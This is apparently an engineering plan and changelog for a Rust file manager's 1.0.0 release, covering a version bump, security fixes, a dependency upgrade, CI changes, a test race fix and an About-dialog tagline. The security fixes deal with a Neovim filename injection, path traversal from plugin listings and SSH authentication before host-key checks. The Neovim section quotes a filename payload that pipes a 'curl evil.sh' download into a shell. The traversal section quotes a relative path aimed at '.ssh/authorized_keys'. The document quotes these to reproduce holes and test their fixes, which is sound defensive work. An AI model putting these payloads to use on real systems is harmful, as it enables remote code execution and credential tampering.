# 01 — What the fork found

**Status:** planned 2026-10-24; **all nine items built the same day.** Sizes are per item, and
what each one actually cost is in it.

[ChrisTitusTech/Path](https://github.com/ChrisTitusTech/Path) is a fork of kiki taken at
roughly 0.5/0.6 and renamed throughout — `kiki` → `path`, `kikid` → `pathd`,
`crates/kiki-*` → `crates/path-*`, `KIKI_` → `PATHFM_`, `.kiki-part` → `.path-part`. Five of
its commits were read:

| commit | subject | for kiki |
| --- | --- | --- |
| `849202a` | Harden SSH trust, transfer paths and temporary files, and Neovim reuse | items 2, 3, 5, 6 |
| `be4d2ba` | Preserve local file permissions when publishing secure staged copies | item 4 |
| `7e7bb8e` | Allow pinned CI validation and exclude manual runs from release selection | item 7 |
| `028fc76` | Give parallel listing tests distinct temporary directories | item 8 — and it is a live bug here |
| `7fbb9bd` | fix(clippy): address Rust 1.99 compatibility | nothing — kiki is already past it; see `ignored.md` |

Because the fork renamed everything, no patch applies. Items 2-8 are each a re-implementation
against kiki's own files; items 1 and 9 are this cycle's own. All nine are built.

What the fork changed and kiki declines is in `ignored.md` beside this file: one commit with
nothing in it for us, and five lines inside commits kiki *is* taking that would be a regression
here if followed. Read it before starting — the risk is not that someone declines them
deliberately, it is that someone follows the fork's diff into them.

---

## 1. The version

**Done 2026-10-24: `1.0.0`.** The four files below, and `Cargo.lock` refreshed so every
workspace member reports `1.0.0` (`cargo metadata`, nine member versions). `make lint`'s
`tests/version_check.py` says `version: 1.0.0` with none disagreeing; `cargo clippy
--all-targets -- -D warnings` and `cargo fmt --check` are clean on it.

`0.6.0` was released and tagged, so the first commit of this cycle moves the version off it —
now, not as a release chore at the end, so that every build, socket name and package made while
the rest is being written already says what it is. `release.yml:58-61` reads the version out of
`packaging/PKGBUILD` and refuses one that is already a tag, so this is also what makes the
eventual release possible at all ("releasing is: bump `pkgver` (and the workspace version) and
push first" — `release.yml:7`).

Four files, and `make lint` proves they agree (`tests/version_check.py`, from `Makefile:120`):

- `Cargo.toml:12` — the workspace's, which every crate inherits (`kikid/Cargo.toml:3` is
  `version.workspace = true`).
- `qml/kiki/version.js:6` — `var version`. Not cosmetic: the daemon's socket is named for the
  version and a window refuses a daemon of another one on `Hello` (`docs/0.2.0/03-fixes.md`),
  so a half-done bump is a window that cannot reach its daemon.
- `packaging/PKGBUILD:11` — `pkgver`, the one the release reads.
- `packaging/omarchy/PKGBUILD:9` — `pkgver`.

`Cargo.lock` follows on the next cargo command. `packaging/omarchy/.SRCINFO` is **not** touched
by hand: `release.yml:204` regenerates it with `makepkg --printsrcinfo` in the same commit that
writes the release's checksums, and `release.yml:189` skips that commit outright if `pkgver` on
main has moved on since — so nothing here goes near a checksum.

**Why `1.0.0`.** The owner's call, 2026-10-24, replacing the `0.7.0` this folder was first
written as. Settled, not provisional. What the number says that `0.7.0` does not: the daemon's
protocol, the config file, the plugin SDK and the keys are what they are, and a change to any
of them from here is one somebody is owed notice of — `docs/0.1.0/API-DAEMON.md` and an
`API-DELTA.md` per release are that notice. `docs/1.0.0/API-DELTA.md` is written: items 3 and 5
change what a plugin may send and what a refused host key does, and `docs/0.1.0/API-PLUGIN.md`
carries both.

**And what it commits to.** `1.0.0` is a stability claim, and items 2-7 were three ways in: a
filename that runs a command, a server that names a path outside the root, a password offered
to an unverified host. The version is not the tag, and nothing mechanical stops `v1.0.0` being
published with holes open — `release.yml:58-61` only refuses a tag that already exists — so the
gate was written down here: **items 2-7 done before `v1.0.0` is tagged.** All three landed the
same day, so the gate is met and nothing is waiting on it. Kept as the reason the order of work
was what it was.

**Size:** ten minutes, as estimated.

---

## 2. A filename is not a keystroke

`kikid/src/openin.rs:38` — the Neovim preset's `reuse` template:

```
nvim --server {socket} --remote-send '<Esc>:e {file}<CR>:{line}<CR>'
```

`prepare` (`openin.rs:184-195`) puts `{file}` through `shell_quote` (`openin.rs:112`), so the
command is safe *as shell*. But `--remote-send` does not take a filename — it takes keys to
type into the running editor, and it interprets `<…>` keycodes in whatever it is given. A file
named

```
notes<CR>:!curl evil.sh|sh<CR>.txt
```

is a legal filename on every filesystem kiki lists. Choose it, Open in → Neovim, with an nvim
session already up, and `:!curl evil.sh|sh` is typed and run in the user's editor, as the user.
No shell quoting can close this, because the shell is not what is interpreting the string.

The path to it is ordinary: an unzipped archive, a folder someone shared, a directory copied
down from a server. The reuse branch (`openin.rs:259-270`) is what runs when nvim is already
alive, which after the first open is always.

**Done 2026-10-24.** The preset's `reuse` is now the marker `nvim-rpc` (`NVIM_RPC`), and a
reuse that asks for it is built as argv in Rust rather than as a shell command:
`nvim --server <socket> --remote-expr <expr>`, four elements, no `sh -c`. `nvim_expression`
rebuilds the path from character numbers so nothing in a name can be read as syntax:

```rust
format!("execute('edit ' . fnameescape(join(map([{chars}], 'nr2char(v:val)'), ''))) . execute('call cursor({}, 1)')", line.max(1))
```

**Proved, not assumed.** Before trusting the fix, the hole was reproduced: a file named
`x<CR>:!touch PWNED<CR>.txt` fed to the old template's mechanism
(`feedkeys(nvim_replace_termcodes(…))`, which is what `--remote-send` does to what it is given)
created `PWNED`. The same name through `nvim_expression` created nothing and opened the right
file at the right line. `openin.rs`'s new `neovim_treats_hostile_filenames_as_data` keeps that
honest for seven names — command substitution, a quote-and-semicolon, a pipe into `writefile`,
two keycode payloads, an embedded newline, a quote and a backslash — each driven through a real
headless `nvim -u NONE`, asserting the file it actually opened, the line it sat on, and that no
marker file appeared.

**Where this departs from the plan as written, and why.** The plan said to branch on
`id == "neovim"` and ignore any stored `reuse` for it, calling the alternative a blocklist.
Implementing that turned up `tests/e2e/run.sh:51-56`, which deliberately overrides the Neovim
entry with `command = "true"` and `reuse = "true"` so that a test run starts no editor to take
the keyboard — and `on_path("")` returns `true` (`openin.rs:50-55`), so that fixture's tool is
live. Branching on the id makes a documented config key silently do nothing for one tool, and
breaks that fixture.

So the discriminator is **what is asked for, not who asks**: `reuse == NVIM_RPC` picks the RPC
path, and anything else is a shell template as before. The argument that settles it is that
`command` has exactly the same property — a user-supplied template, shell-quoted by `prepare`,
whose program may do what it likes with the argument — and nobody would make `command`
unoverridable. What was wrong was the template kiki *shipped*, and that is what changed. A
leftover copy of the old one in somebody's `open-in.toml` is now said out loud (one line naming
`--remote-send`, what it does, and that dropping the override is the fix) rather than silently
replaced. `nvim_reuse` also takes the tool's id for its socket, which makes `nvim-rpc`
something a second, differently-named nvim entry can ask for on purpose.

**And the test does not pass by skipping.** Without `nvim` on `PATH` it prints that nothing was
proved and that CI's container installs it; `neovim` is now in the rust job's `pacman -Syu` line
(`.github/workflows/ci.yml:39`) so that it runs there.

**Checked.** `cargo test` 48 suites / 0 failed, the new test among them · `make test-qml` 846 +
12 passed · clippy `-D warnings` and `cargo fmt --check` clean · the e2e fixture's `reuse` is
still honoured, so the suite is unaffected by design rather than by luck.

**Size:** half a day, as estimated.

---

## 3. An untrusted name joined to a root

A plugin's `Scan` reply names its own entries, and kiki joins those names to a local root
without looking at them:

- `kikid/src/mirror/scan.rs:62` — `rel` from the recursive scan, `:140` — `name` from the
  per-directory scan. Straight into the side map, and from there into every path the plan
  builds.
- `kikid/src/mirror/execute.rs:12-29` — `enforce_guards` checks for `..`, a leading `/` and an
  empty string, but only on `Delete`/`Rmdir` actions, and only after an early return when the
  plan deletes nothing. **A `Copy` action's `rel` is never checked at all**, so a mirror that
  only adds files is unguarded.
- `execute.rs:258` and on — the local→local branch joins and writes; the remote→local branch
  writes to `<name>.kiki-part` (`execute.rs:211-213`), a name an attacker can predict, and
  `std::fs::File::create` follows a symlink that is already sitting there.
- `kikid/src/transfer.rs:42, 53, 199, 427, 544` — `mkdir`, `delete`, `landed`, `arrived_whole`
  and `rename` all `root.join(rel)` with no check, and `delete` goes on to `remove_tree`.

So a server that answers a listing with `rel: "../../.ssh/authorized_keys"`, or a pre-planted
`notes.txt.kiki-part` symlink in the download folder, writes outside the root the user chose.
The threat is not only a malicious host: it is any plugin, including a third-party one, and any
server that has been taken over since the location was saved.

**Done 2026-10-24.** `kikid/src/mirror/safety.rs`, `pub(crate)` so `transfer.rs` can use it
too: `validate_rel` (no empty, `.`, `..` or NUL component — which also rejects an absolute path,
its first component being empty), `validate_name` (that, and no `/` at all), `local_path`
(walks the relative path a component at a time, each opened `O_DIRECTORY | O_NOFOLLOW |
O_CLOEXEC`, and returns the leaf anchored to its parent), `open_source` (`O_NOFOLLOW`, and
refuses anything that is not a regular file) and `create_part`.

Called at every boundary: both scan loops (`scan.rs`, where a server's name *arrives*, so it
never reaches a plan), `enforce_guards` — now above the delete-count early return and over every
checked action, not only deletes — `run_action`, `copy_file` on both ends and in all four
branches, `fill_local_digests`, and six sites in `transfer.rs` (`mkdir`, `delete`, `landed`,
`arrived_whole`, `rename`, and the name an op was given).

**The fast path is kept, and it cost six lines, not a redesign.** The plan called the
`ops::copy_file` question "the one piece of real design work". It turned out not to be: because
`local_path` yields a *path* (`/proc/self/fd/<parent>/<leaf>`), every existing path-taking call
— `create_new`, `create_dir`, `remove_tree`, `rename`, `set_mtime`, and `copy_file_range` itself
— becomes confined with no signature change at all. `ops.rs` gained only a split, `copy_file`
→ `copy_open_file`, so the mirror can supply a source it opened itself with `O_NOFOLLOW`. The
`copy_file_range` reflink path, the `fallocate`, the `fadvise` and the 64 MiB cancel granularity
are untouched, and no `tempfile` dependency was needed, so `dep_audit.rs` and the PKGBUILDs are
untouched too.

**The `.kiki-part` name stays.** The hole there was `File::create`, which follows a symlink, so a
part file planted ahead of time was written *through*. It is now `create_part` — unlink, then
`O_CREAT | O_EXCL | O_NOFOLLOW` under the anchored parent — which refuses a planted link while
still replacing a stale part file from a run that was killed. Keeping the name matters:
`tests/plugin_killed.rs` and `joblog.rs`'s test both read it, and the fork's switch to `tempfile`
is what forced it to rewrite them. The same fix went to the same-plugin spool in
`std::env::temp_dir()`, whose name is predictable in a shared directory.

**A footgun found by a failing test, and then designed out.** `LocalPath` first exposed its path
as a public `PathBuf`, and two tests in `undo_remote.rs` began failing with
`NotFound` on a file that was plainly there. The cause:
`&if rel.is_empty() { root.clone() } else { local_path(p, rel)?.path }` drops the guard at the
end of the **`else` block**, not the end of the statement, so the descriptor closed and
`/proc/self/fd/<n>` was gone before the path was used. A probe confirmed it precisely — bound
guard fine, same-statement temporary fine, detached path ENOENT. The field is now private behind
`path(&self) -> &Path`, which makes the guard impossible not to bind, and a test asserts the path
stops resolving once the guard is dropped so the reason stays written down.

**Checked, and the tests proved load-bearing.** Four unit tests in `mirror::safety` (the
validator's table; a symlinked parent refused *and* an open parent surviving its directory being
renamed and replaced with a symlink; a source that is a link or a directory refused; a planted
part file not written through). One end-to-end mirror test:
`a_copy_refuses_a_name_that_leaves_the_root_and_follows_nothing` — seven bad names refused at
both ends, a destination symlink replaced rather than written through, a symlinked parent
refused, a linked source refused, and the source's mode carried onto the copy. One integration
test through a real plugin process, `kikid/tests/transfer_security.rs`, driving a hostile-listing
mode added to the stub behind `KIKI_STUB_UNSAFE_SCAN` and covering **both** scan paths —
`/unsafe-recursive` answers the recursive `Scan`, `/unsafe-fallback` refuses it so the
per-directory walk is exercised too — plus an assertion that an ordinary listing still scans, so
the check is not simply refusing everything. With `validate_rel` neutralised all three fail; with
it restored all three pass.

Error code 1224 was reused and its wording generalised in all three catalogs: it said "refusing
to delete outside the replica root" and the check is no longer about deleting. `error.*` keys are
localized with placeholders compared across languages (`tests/i18n_check.py`), so the `{path}`
placeholder is unchanged and `es.js`/`ja.js` were rewritten, not left behind.

`cargo test` 49 suites / 0 failed · `make test-qml` 846 + 12 passed · clippy `-D warnings`,
`cargo fmt --check`, `i18n_check` (575 keys, whole) and `version_check` all clean.

**Measured, 2026-10-24, the owner's machine** — the same one the baseline was taken on (i5-1245U,
15.6 GB), `taskset -c 0-3`, fixture on tmpfs at `/tmp/kiki-perf/all`, a warm run discarded first
because that is how the recorded numbers were taken (`docs/0.5.0/07-measure-before-tag.md`: a
cold first run is what made `photos.thumbs_ms` look like a regression on 10-02 when it was not).
`kikid bench compare` against `bench/baseline-linux-x86_64.json`: **no regressions beyond 25 %**.

Read line by line rather than left at the gate, because this item rewrote every copy and every
scan:

| line | 0.5.0 base → 1.0.0 | verdict |
| --- | --- | --- |
| `flat200k.mirror_scan_ms` | 174.35 → **164.88** (−5 %) | **the one that mattered.** Every one of 202 000 entries now goes through `validate_rel` on the way in, and the scan got *faster*. The per-name check costs less than the noise. |
| `flat200k.rescan_ms` | 111.00 → **104.01** (−6 %) | faster; the 10-02 fix holds. |
| `copy64m_ms` / `copy_mb_s` | 19.42 → 19.45 ms mean, ~3.2 GB/s | **unchanged — `copy_file_range` is intact.** The same 64 MB copy is measured once per profile, so the four readings are four samples of one operation: 18.23–20.63 now, 18.91–19.93 on the base. Five repeats of one profile with nothing changed read 18.58, 19.11, 20.15, 20.80, 21.74 — **±8 % run to run**, which is where the single flagged line (`flat200k.copy64m_ms` +8 %) sits. At 3.1–3.5 GB/s this is plainly still the in-kernel path and not a userspace byte loop. |
| `photos.enrich_ms` +133 %, `photos.mirror_scan_ms` +50 %, `photos.window_ms` +33 %, `deep100k.phase1_first_chunk_ms` +22 % | — | **not real.** 0.16, 0.07, 0.06 and 0.04 **milliseconds** on a 200-file fixture — at timer resolution for a single shot, and the doc warns micro numbers on this machine swing about twofold with the day. Every large-N line, where the magnitude is trustworthy, improved. |

Numbers in `bench-1.0.0.json` beside this plan's scratch; `bench/baseline-linux-x86_64.json` is
**not** updated here, because its `build` field records a commit and nothing is committed yet —
recording a new baseline belongs at the tagged build.

**Size:** well under the two to three days estimated, because the `/proc/self/fd` anchoring made
the design question disappear.

---

## 4. Permissions and times survive the staging

**Done 2026-10-24 — by not doing it.** This item existed because staging a copy through
`NamedTempFile` publishes a file created 0o600, which is how the fork stripped the source's mode
off every local→local mirror copy and had to fix itself six minutes later.

Kiki never stages local→local: item 3 kept `ops::copy_file`, and its `finish_copy`
(`kikid/src/ops.rs:138-144`) already carries the source's mode and its mtime onto the
destination. So the requirement was already met, and the fork's regression never applied here.

It is asserted rather than assumed: `a_copy_refuses_a_name_that_leaves_the_root_and_follows_nothing`
copies a source set to 0o750 and checks the copy is 0o750 — so if anyone ever does swap in a
staging step, this item's requirement fails loudly instead of silently.

The mtime decision in `ignored.md` still stands: local→local may read the source handle, every
remote case keeps the planned `mtime` argument and its `exact_times` reasoning.

**Size:** nothing, as it turned out.

---

## 5. SSH: refuse before authenticating

`plugins/kiki-plugin-sftp/src/main.rs:139-141`:

```rust
// Unknown to ssh as well. The key is reported back with the reply; kiki shows it to
// the user, and once they accept it, saves it as `trustedFingerprint`.
KnownHosts::Unknown => Ok(true),
```

The intent is right and the UX is right — kiki asks, and pins on a yes. What is wrong is the
order. `Ok(true)` lets the handshake continue, so russh goes on to **authenticate**: the
password, or a signature from the user's key, is offered to a host nobody has ever verified.
By the time the shell shows "this server's key has not been verified yet", the credential has
already gone to whoever answered that address. The fingerprint prompt is a question asked after
the answer stopped mattering.

**Done 2026-10-24.** `KnownHosts::Unknown => Ok(false)`, so the handshake stops before
authentication, and the connect error path returns `PluginError::invalid("fingerprint", fp)`
when nothing is pinned and `known_hosts` did not vouch. That is the shape FTPS already uses and
`kikid/src/locations.rs:267-272` already reads, so the window's existing verify-and-pin flow
picked it up with no shell change at all: `locations.rs:303` wraps it in `UNVERIFIED_PREFIX` and
`kikid/src/handlers/locations.rs:27` hands the window `{verify: <fp>, host}`. The comment at
`locations.rs:264-266` that said SFTP "answers the same question with a reply instead" now says
what it does.

**The property, asserted rather than described.** The mock server counts `auth_attempts` on all
three auth methods, and `an_unknown_host_is_refused_before_anything_is_offered_to_it` asserts
**zero** of them against a refused key — along with the refusal carrying that server's actual
fingerprint, and the same key pinned then connecting normally. Counting only successful `auths`,
as the fixture did, would have passed happily while the password went out on the wire; the
attempt counter is the whole point.

**What it cost, and what it turned up.** Every test that merely connects relied on
`Unknown => Ok(true)`. The fixture now records each mock server's host-key fingerprint by port
(`HOST_KEYS`) and `Plugin::spawn` sets `pin_fixture`, which puts that fingerprint into any
`Connect` that does not already name one — so a test that is not about host keys says which key
it trusts, exactly as a saved location does, while the tests that *are* about host keys spawn
through `spawn_with` and make the real decision. One test then failed honestly rather than by
fixture: `a_pinned_key_must_match` learned the fingerprint by connecting unpinned first, which
is now refused. It takes the fingerprint from the refusal instead — which is how a user comes by
it now, so the test got closer to the thing it is testing.

**And it did not need the russh upgrade.** Three lines of decision against russh 0.52. Item 6
stays a separate commit.

**Checked.** `cargo test -p kiki-plugin-sftp` 8 + 23 passed / 0 failed; `cargo test` 48 suites /
0 failed; clippy `-D warnings` and `cargo fmt --check` clean. The e2e flows that drive a real
`sshd` (`mirror_sftp`, `side_by_side`, `quick_look`, `remote_transfers`, `whatsnew011`) needed no
change: `tests/e2e/servers.py:338-343`'s `add_location` already did the two-step "the first
answer is the server's key, the second trusts it", because FTPS always worked this way — so
those flows now exercise the same path for SFTP, and the check that reads "the SFTP location is
added, its host key trusted" is true in a way it was not before.

**Size:** a day, as estimated; four-fifths fixture, as expected.

---

## 6. russh 0.52 → 0.64.1

**Done 2026-10-24.** `0.52.1` → `0.64.1`, on its own commit as the plan asked, so a regression
here has one cause.

**The risk the plan named turned out not to exist.** "Unbounded if `russh-sftp` has not kept up"
was the stated worry. `russh-sftp` does not depend on `russh` at all — it speaks SFTP over any
`tokio` stream, which is why the plugin hands it `ch.into_stream()` — so there was nothing to
keep up. It is still 2.4.0, untouched, and the lockfile proves it.

**And the surface was one line wide.** Of roughly twenty-five russh calls in the plugin, exactly
one needed changing: `check_server_key`, whose argument is now a `PublicKeyOrCertificate`.
`load_secret_key`, `check_known_hosts_path`, `authenticate_publickey` with
`PrivateKeyWithHashAlg`, `best_supported_rsa_hash`, the keyboard-interactive pair,
`channel_open_session`, `request_subsystem`, `into_stream`, `client::Config`, `Disconnect` and
`fingerprint(HashAlg::Sha256)` all compiled untouched. The mock needed the four the plan
predicted and no others: `rand::thread_rng()` → `rand::rng()` (twice), `channel_open_session`
taking a `ChannelOpenHandle` and accepting through it rather than returning `true`,
`session.data` taking bytes instead of a `CryptoVec`, and that import going.

**A certificate is refused, and says so.** The policy is the fork's and right for kiki — there is
no certificate authority in a trust model that is "one key per location, or one `known_hosts`
already vouches for". What kiki does not take is the fork's bare `Ok(false)`: that surfaces
through the same path as a key that disagrees, and the person would be shown "the host key of X
has changed", which is the one error they must not misread. The handler has its own
`certificate` flag, checked before `refused`, and the refusal says a certificate was offered,
what kiki trusts instead, and what to do about it.

**The feature choice, and why it is not the default.** `default-features = false` with
`["ring", "rsa", "flate2"]`. 0.64's own default is `["flate2", "aws-lc-rs", "rsa"]`, and
`aws-lc-rs` wants cmake and a C toolchain — which the aarch64 package container would have to
grow for no gain, since `ring` covers what kiki speaks. Verified rather than assumed: the
lockfile has `ring 0.17.14`, no `aws-lc-rs`, and no `cmake` or `bindgen` build dependency.

**One thing to keep an eye on.** russh 0.64.1 declares `rust-version = 1.89`. This machine is
on 1.99 and the builders track Arch, so there is room — but it is the first hard MSRV floor in
kiki's tree, and the aarch64 container (`menci/archlinuxarm:base-devel`, which follows Arch ARM
at its own pace) is the one to watch if it ever lags.

**And one thing that is not an issue, noted so it is not raised as one.** russh 0.64 pulls
`rsa 0.10.0-rc.18`, `ssh-key 0.7.0-rc.11` and `pkcs1 0.8.0-rc.4` transitively — the only
pre-release versions in the lockfile. That is normal and changes nothing: these are the current
RustCrypto releases, russh chose them, and kiki's own version number says nothing about its
dependencies'. The tree already carries twelve direct pre-1.0 dependencies (`gio 0.20`,
`rustls 0.23`, `image 0.25`, `png 0.17`, `libc 0.2`, `log 0.4` and the rest), and russh itself
was `0.52` through 0.5.0 and 0.6.0. An `-rc` suffix is not a different category from `0.x`.

(Aside, in case it confuses someone later: `cargo info russh` here reported "latest 0.63.3",
which is a stale local index. 0.64.1 was published 2026-10-05; crates.io is the authority.)

**Checked.** `cargo test -p kiki-plugin-sftp` 8 + 23 passed / 0 failed, including every host-key
test from item 5 and the mock driving a real russh server. `cargo test` 49 suites / 0 failed ·
`make test-qml` 846 + 12 · clippy `-D warnings`, `cargo fmt --check`, `i18n_check` and
`version_check` clean.

**Size:** half a day, which is the good end of the plan's "half a day or open-ended".

---

## 7. CI: validate a revision by hand; do not release a manual run

**Done 2026-10-24.** Two small, independent things, taken together because the second is only
needed once the first exists.

**(a)** `.github/workflows/ci.yml` gains a `workflow_dispatch` with a `revision` input, and
`ref: ${{ inputs.revision || github.sha }}` on its checkouts — so a tag, or the commit before a
suspected regression, goes through the whole suite without pushing anything. On a `push` or
`pull_request` the `inputs` context is empty and the expression falls through to `github.sha`,
which is what checkout would have used anyway.

**Four checkouts, not two.** The plan said "both" from reading the fork, whose CI has two jobs.
Kiki has four — `rust`, `store-package`, `fuzz` and `qml` (`ci.yml:23, 117, 156, 180`) — and all
four carry the `ref`. Giving it to only some would be worse than not having the feature at all:
a dispatched run would then test the chosen revision in one job and the branch head in another,
and report one green tick over both.

**(b)** `release.yml` picks the newest green CI run on main. Once (a) exists, a manual run
against some other revision can *be* that newest green run, and the release would ship a commit
nobody chose. `--event push` on both queries (`release.yml:36, 42`) confines the choice to what
was actually pushed to main.

**Checked.** Both files parse, with the triggers and jobs they should have
(`workflow_dispatch`, `push`, `pull_request`; `rust`, `store-package`, `fuzz`, `qml`). The rest
is unverifiable until the next push — the same caveat `docs/0.5.0/08-ci-once.md` carries, and
(a) is partly a way of shortening it.

`neovim` was added to the rust job's packages as part of item 2, so that item's test runs in CI
rather than skipping.

**Size:** an hour, as estimated.

---

## 8. The parallel-test collision

`028fc76` gave the fork's `temp_tree` a counter because two tests asking for the same `n` got
the same directory. **Kiki has the same bug.** `kikid/src/listing/tests.rs:8-15`:

```rust
fn temp_tree(n: usize) -> Scratch {
    let dir = Scratch::new(&format!("listing-{}", n));
```

`Scratch::new` is `temp_dir()/kiki-<tag>-<pid>` (`kikid/src/scratch.rs:17-19`), so the path is
decided by `n` and the pid alone. `temp_tree(3)` is called twice — `listing/tests.rs:305` and
`:663` — and `make test-rust` is a plain `cargo test` (`Makefile:32`), so those two run on
different threads of one process against one directory. It is worse than it looks, twice
over: `Scratch::named` **begins** with `remove_dir_all` (`scratch.rs:23-24`), so whichever
test starts second wipes the first one's tree out from under it; and `Scratch`'s `Drop`
(`scratch.rs:70-76`) deletes the folder, so whichever *finishes* first takes the other's files
with it. The symptom is a listing test that fails with a wrong count, once in a while, on a
machine with enough cores — which is the worst kind of failure to go looking for later.

**Done 2026-10-24.** A `static AtomicUsize` in `Scratch::new`, so the folder is
`kiki-<tag>-<pid>-<nth>` and **every** scratch is unique by construction — not in `temp_tree`,
which would have fixed one caller and left the next to rediscover this (`listing/tests.rs` alone
has eight other `Scratch::new` tags that are unique only because somebody picked them
carefully). `temp_tree` itself is untouched. `Scratch::named` keeps its exact-name contract and
gets no count: `share.rs:151` names a scratch by a job's id and `tests/share_contract.rs:241-266`
spells that path out by hand, so a count there would have broken a passing test — which is why
every one of the sixty-odd callers was read before the change rather than after.

**With a test that fails without it.** `scratch.rs`'s new
`the_same_tag_twice_is_two_folders` asserts two same-tag scratches get different folders,
cannot see each other's files, and that dropping one leaves the other's folder standing. Backed
out the counter and it fails on the first assertion ("two scratches with one tag must not share
a folder"); put back, it passes — so the test is known to be load-bearing and not decorative.

**Checked.** `cargo test`: 48 suites, 0 failed (the daemon's own 161 among them). `cargo clippy
--all-targets -- -D warnings`, `cargo fmt --check` and `make test-qml` (12 passed) all clean.

**The stale-folder question, answered.** `Scratch::new`'s leading `remove_dir_all` was described
as clearing a folder from an earlier run, and with a count in the name it never will. It never
did: the pid was already in the name, so another run's folder had another name, and the only
thing that opening ever cleared was a collision *within* one process — which is to say the bug.
`Drop` is what answers the owner's original complaint (`scratch.rs:1-6`) for every normal exit,
and it still does.

**Size:** twenty minutes, as estimated.

---

## 9. The About line

**Done 2026-10-24.** `qml/kiki/i18n/en.js:288` said `"about.tagline": "The Omarchiest of file
managers"`, shown once under the wordmark in the About dialog
(`qml/kiki/ui/AboutDialog.qml:60-64`, muted mono 12px): a superlative about somebody else's
project in the one window that is supposed to say what kiki is. It had also already failed
translation — `es.js` and `ja.js` rendered it as flat description, so the joke existed in one of
the three languages kiki ships.

**It is now "Fast by default."** Chosen from twenty-five candidates across five registers
(plain, speed, reach, manner, the cat) against the rule that whatever goes in that slot has to
mean the same thing literally in all three languages, since missing that is exactly what was
wrong with the old line. It is also the one claim `docs/0.5.0/07-measure-before-tag.md` and
`10-faster-listings.md` actually back, said without a figure a slower machine can falsify.

The three values, written rather than left in English (`docs/0.2.0/02-localization.md`, which
`tests/i18n_check.py` enforces):

| catalog | value | |
| --- | --- | --- |
| `en.js:288` | `Fast by default` | |
| `es.js:283` | `Rápido por defecto` | `por defecto` is this catalog's own phrasing (`es.js:355`). |
| `ja.js:283` | `はじめから速い` | "fast from the outset". **Deliberately not `既定で高速`:** 既定 is the word this catalog uses for a *setting's* default (`ja.js:150`, `:344`, `:370`), so in a tagline it reads as "fast in the default configuration" rather than "fast without being asked". Say the word if the settings register is wanted instead. |

**Checked.** `tests/i18n_check.py` — 575 keys, 3 catalogs, all whole. `make test-qml` — 12
passed, 0 failed. Nothing under `tests/` asserts the tagline text, and the one flow that renders
the panel (`tests/e2e/flows/photographs.py:67`) photographs it for the app images without
asserting, so its next run picks the new line up on its own.

The key stays. Removing the line altogether was the fallback, and it is the only option that
touches QML — the `Text` block and one of the two spacers — which makes it a layout change
rather than a string change, and the slot now earns itself.

---

## Order, and what each one is worth

1. ~~**Item 1**, ten minutes~~ — **done 2026-10-24**, with item 9 alongside it. Everything
   built from here says `1.0.0`.
2. ~~**Item 8**, twenty minutes~~ — **done 2026-10-24**. The suite no longer races itself, so
   every result below can be trusted as it arrives.
3. ~~**Item 2**, half a day~~ — **done 2026-10-24**. The worst thing on this page, and the
   cheapest of the three security items, so it went first of them.
4. ~~**Item 5**, a day~~ — **done 2026-10-24**. Credentials no longer reach an unverified
   host, and it needed no dependency change, as expected.
5. ~~**Item 7**, an hour~~ — **done 2026-10-24**, and (a) makes the rest easier to check.
6. ~~**Item 3 + 4**, two to three days~~ — **done 2026-10-24**, and faster than that: the
   `/proc/self/fd` anchoring kept `copy_file_range` without the redesign the plan expected, and
   item 4 turned out to need no change at all. It still wants a benchmark run before the tag,
   because it touches every copy kiki makes.
7. ~~**Item 6**, half a day or open-ended~~ — **done 2026-10-24**, on its own commit after
   item 5, and it was the half-day end: `russh-sftp` never depended on `russh`, so the risk
   that made it open-ended was not there.

Items 2, 3 and 5 are each exploitable by a hostile filename, a hostile server reply, or an
impersonated host respectively, so all three belong in whatever release this becomes, and its
notes should say what they were. **All three are now done**, which is what the `v1.0.0` gate in
item 1 was waiting on; item 6 is a dependency upgrade, not a hole.

Before starting any of them, read `ignored.md`. Items 2, 3, 4, 6 and 8 each have a line in the
fork's diff that reads like part of the fix and is not, and that file is where the reasoning
for leaving each one alone is kept.
